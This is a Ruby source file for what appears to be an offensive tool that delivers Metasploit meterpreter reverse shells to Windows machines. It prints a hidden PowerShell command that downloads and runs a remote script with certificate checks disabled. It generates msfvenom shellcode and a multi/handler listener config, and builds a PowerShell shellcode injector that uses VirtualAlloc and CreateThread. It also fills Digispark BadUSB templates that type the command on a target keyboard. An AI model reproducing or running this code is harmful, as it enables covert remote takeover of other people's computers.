#!/usr/bin/env ruby
# Thanks to:
# @mattifestation, @obscuresec, and @HackingDave
require 'socket'
require 'openssl'
require 'readline'
module MainCommands
  def print_error(text)
    print "\e[31;1m[-]\e[0m #{text}"
  end

  def print_info(text)
    print "\e[34;1m[*]\e[0m #{text}"
  end

  def print_success(text)
    print "\e[32;1m[+]\e[0m #{text}"
  end

  def get_input(prompt = '', default = '')
    choice = Readline.readline(prompt, false)
    choice = default if choice == ''
    choice
  end

  def file_root
    File.expand_path(File.dirname($PROGRAM_NAME))
  end

  def cert_dir
    file_root + '/certs/'
  end
  
  def template_dir
    file_root + '/template/'
  end

  def ssl_setup(host, port)
    tcp_server = TCPServer.new(host, port)
    ctx = OpenSSL::SSL::SSLContext.new
    crt = "#{cert_dir}server.crt"
    ctx.cert = OpenSSL::X509::Certificate.new(File.open(crt))
    ctx.key = OpenSSL::PKey::RSA.new(File.open("#{cert_dir}server.key"))
    server = OpenSSL::SSL::SSLServer.new tcp_server, ctx
    server
  end

  def powershell_command(url, template_dir)
    cmd = 'powershell -windowstyle hidden "[System.Net.ServicePointManager]::'
    cmd << 'ServerCertificateValidationCallback = { $true };IEX (New-Object '
    cmd << "Net.WebClient).DownloadString('#{url}')\""
    print_info("Run this from CMD\n\n")
    puts cmd
	puts "" #Some space
	sleep(1)
	digisparkrun = get_input('Generate the Digispark .ino script? [YES/no]: ', 'yes')
	if digisparkrun.downcase[0] == 'y'
		digispark(url, template_dir)
		print_success("The rapid_shell.ino script has been generated successfully, check the ~/templates folder and upload it to your Digispark.\n")
	end
	#ino_file = "#{template_dir}rapid_shell.ino"
	#inocmd = `ruby -pi.template -e " gsub(/AUTOVALUE/, '#{cmd}') " ino_file`
	#transform_ino  = `#{inocmd} 2> /dev/null`
	#print_success("The rapid_shell.ino script has been created successfully, check the template folder.\n")
	#I will add the functionnality to convert cmd into azerty later
  end

  trap('INT') do
    print_error("\nCaught CTRL-C Shutting Down..\n")
    exit
  end
end
module MsfCommands
  def available_payloads(payload)
    payloads = { :'1' => 'windows/meterpreter/reverse_https',
                 :'2' => 'windows/meterpreter/reverse_tcp' }
    payloads[:"#{payload}"]
  end

  def msf_path
    if File.exist?('/usr/bin/msfvenom')
      @msf_path = '/usr/bin/'
    elsif File.exist?('/opt/metasploit-framework/msfvenom')
      @msf_path = ('/opt/metasploit-framework/')
    else
      print_error("Metasploit Not Found!\n")
      exit
    end
  end

  def generate_shellcode(host, port, payload)
    msf_path
    print_info("Generating Shellcode\n")
    msfcmd = "#{@msf_path}./msfvenom --payload #{payload} LHOST=#{host} "
    msfcmd << "LPORT=#{port} -f c"
    execute  = `#{msfcmd} 2> /dev/null`
    print_success("Shellcode Generated\n")
    shellcode = clean_shellcode(execute)
    shellcode
  end

  def clean_shellcode(shellcode)
    shellcode = shellcode.gsub('\\', ',0')
    shellcode = shellcode.delete('+')
    shellcode = shellcode.delete('"')
    shellcode = shellcode.delete("\n")
    shellcode = shellcode.delete("\s")
    shellcode[0..18] = ''
    shellcode
  end

  def metasploit_setup(host, port, payload)
    msf_path
    #unless Dir.exist?(file_root + '/metaspoit_ps_files/')
    #  Dir.mkdir(file_root + '/metaspoit_ps_files/')
    #end
    file_path = file_root + '/metaspoit_ps_files/'
    rc_file = 'msf_listener.rc'
	#ps_file = 'shell_to_upload.ps1'
    write_rc(file_path, rc_file, payload, host, port)
	#write_ps(file_path, ps_file)
	msfrun = get_input('Start msfconsole now? [YES/no]: ', 'yes')
	if msfrun.downcase[0] == 'y'
		print_info("Setting up Metasploit this may take a moment\n")
		system("#{@msf_path}./msfconsole -r #{file_path}#{rc_file}")
	else
		print_info("-->Checkout this folder for the .ps1 and .rc files: ~/metaspoit_ps_files\n")
		print_info("-->Do not forget to upload the generated .ino script to your Digispark: ~/templates\n")
	end
  end
  
    def ps1_cmd(shellcode)
    s = %($1 = '$c = ''[DllImport("kernel32.dll")]public static extern IntPtr )
    s << 'VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, '
    s << "uint flProtect);[DllImport(\"kernel32.dll\")]public static extern "
    s << 'IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, '
    s << 'IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, '
    s << "IntPtr lpThreadId);[DllImport(\"msvcrt.dll\")]public static extern "
    s << "IntPtr memset(IntPtr dest, uint src, uint count);'';$w = Add-Type "
    s << %(-memberDefinition $c -Name "Win32" -namespace Win32Functions )
    s << "-passthru;[Byte[]];[Byte[]]$sc = #{shellcode};$size = 0x1000;if "
    s << '($sc.Length -gt 0x1000){$size = $sc.Length};$x=$w::'
    s << 'VirtualAlloc(0,0x1000,$size,0x40);for ($i=0;$i -le ($sc.Length-1);'
    s << '$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1)};$w::'
    s << "CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};';$gq = "
    s << '[System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.'
    s << 'GetBytes($1));if([IntPtr]::Size -eq 8){$x86 = $env:SystemRoot + '
    s << %("\\syswow64\\WindowsPowerShell\\v1.0\\powershell";$cmd = "-nop -noni )
    s << %(-enc";iex "& $x86 $cmd $gq"}else{$cmd = "-nop -noni -enc";iex "& )
    s << %(powershell $cmd $gq";})
  end

  def write_rc(file_path, rc_file, payload, host, port)
    file = File.open("#{file_path}#{rc_file}", 'w')
    file.write("use exploit/multi/handler\n")
    file.write("set PAYLOAD #{payload}\n")
    file.write("set LHOST #{host}\n")
    file.write("set LPORT #{port}\n")
    file.write("set EnableStageEncoding true\n")
    file.write("set ExitOnSession false\n")
    file.write('exploit -j')
    file.close
  end
  def write_ps(file_path, ps_file, shellcode)
	ps = ps1_cmd(shellcode)
	file = File.open("#{file_path}#{ps_file}", 'w')
	file.write(ps)
	file.close
  end
  def digispark(url, template_dir)
	select = digispark_layout_select
	if select == 1
		ino_file = "#{template_dir}rapid_shell-qwerty.template"
		inocmd = File.read("#{ino_file}").gsub("AUTOVALUE","#{url}")
	elsif select == 2
		urlazerty = `./layout.sh '#{url}'`
		urlazerty = urlazerty.delete!("\n")
		ino_file = "#{template_dir}rapid_shell-azerty.template"
		inocmd = File.read("#{ino_file}").gsub("AUTOVALUE","#{urlazerty}")
	else
		digispark(url, template_dir)
	end
	#File.open("#{template_dir}rapid_shell.ino", "w").write(inocmd)
	path = "#{template_dir}rapid_shell.ino"
	File.delete(path) if File.exist?(path)
	File.open(path, "w") do |f|
		f.write(inocmd)
	end
  end
  def digispark_layout_select
	print "Please pick the keyboard layout you would like to use: "
	print "
		\n1) QWERTY \
		\n2) AZERTY \
		\n"
	layout_choice = get_input('[1] > ', 1)
	layout_choice.to_i
  end
end
